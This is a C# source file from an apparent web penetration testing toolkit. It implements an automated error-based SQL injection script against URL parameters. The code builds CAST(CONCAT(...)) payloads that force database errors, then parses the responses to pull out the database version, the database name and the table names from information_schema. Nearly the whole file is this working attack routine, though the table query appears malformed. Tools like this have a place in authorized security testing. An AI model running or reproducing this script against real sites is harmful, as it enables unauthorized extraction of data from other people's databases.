using System;
using System.Collections.Generic;
using System.Text;
using System.Text.RegularExpressions;

namespace WAPTT.Scripts
{
    class SQL_Injection_ERROR_Based
    {
        public static string reportResults = String.Empty;


        public static void Script(string url)
        {
            reportResults = "--- STARTING ERROR-BASED SQLI ---\n\n\n\n";

            string[] parms = SQL_Is_Vulnerable.URLParameters(url).Split('&');

            if (parms.Length == 0)
            {
                reportResults += "Script stopped: URL not vulnerable to SQLi";
            }
            else
            {
                foreach (string parm in parms)
                {
                    reportResults += $"--- TESTING PARAMETER \"{parm}\" ---\n\n\n\n";


                    string chars = "1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm";
                    char[] frontRandomArray = new char[8];
                    char[] endRandomArray = new char[8];
                    Random random = new Random();

                    for (int i = 0; i < 8; i++)
                    {
                        frontRandomArray[i] = chars[random.Next(chars.Length)];
                        endRandomArray[i] = chars[random.Next(chars.Length)];
                    }

                    string frontRandom = new string(frontRandomArray);
                    string endRandom = new string(endRandomArray);

                    string isPossibleURL = String.Empty;
                    string extractVersionURL = String.Empty;
                    string extractDatabaseURL = String.Empty;
                    string extractTablesURL = String.Empty;
                    string payload = String.Empty;

                    string isErrorBasedPossible = "LoOk FoR ThIs";

                    payload = parm + $"' AND CAST(CONCAT('{frontRandom}', {isErrorBasedPossible}, '{endRandom}') AS INTEGER)-- ";
                    isPossibleURL = url.Replace(parm, payload);

                    if (!HTTP_Connection.Response(isPossibleURL).Contains(frontRandom + isErrorBasedPossible + endRandom))
                    {
                        reportResults += "URL Not Vulnerable to Error-Based SQLi, probably due to limited error messages\n\n";
                        return;
                    }

                    payload = parm + $"' AND CAST(CONCAT('{frontRandom}', @@version, '{endRandom}') AS INTEGER)-- ";
                    extractVersionURL = url.Replace(parm, payload);

                    Regex regex = new Regex(frontRandom + "([^,' ].*?)" + endRandom);

                    Match versionMatch = regex.Match(HTTP_Connection.Response(extractVersionURL));

                    reportResults += $"Database engine version: {versionMatch.Groups[1].Value}\n\n";

                    payload = parm + $"' AND CAST(CONCAT('{frontRandom}', DATABASE(), '{endRandom}') AS INTEGER)-- ";
                    extractDatabaseURL = url.Replace(parm, payload);

                    Match dbMatch = regex.Match(HTTP_Connection.Response(extractDatabaseURL));

                    reportResults += $"Database name: {dbMatch.Groups[1].Value}\n\n";

                    payload = parm + $"' AND CAST(CONCAT('{frontRandom}', SELECT table_name FROM information_schema.tables, '{endRandom}') AS INTEGER)-- ";
                    extractTablesURL = url.Replace(parm, payload);

                    MatchCollection tableMatches = regex.Matches(HTTP_Connection.Response(extractTablesURL));

                    if (tableMatches.Count == 0)
                    {
                        reportResults += "No tables found!\n\n";
                        return;
                    }

                    reportResults += $"--- EXTRACTING TABLES FROM {dbMatch.Groups[1].Value} DATABASE ---\n\n\n";

                    foreach (Match m in tableMatches)
                    {
                        reportResults += $"{m.Groups[1].Value}\n";
                    }

                }
                
                
            }

            reportResults += "\n\n--- END ---";
        }
    }
}
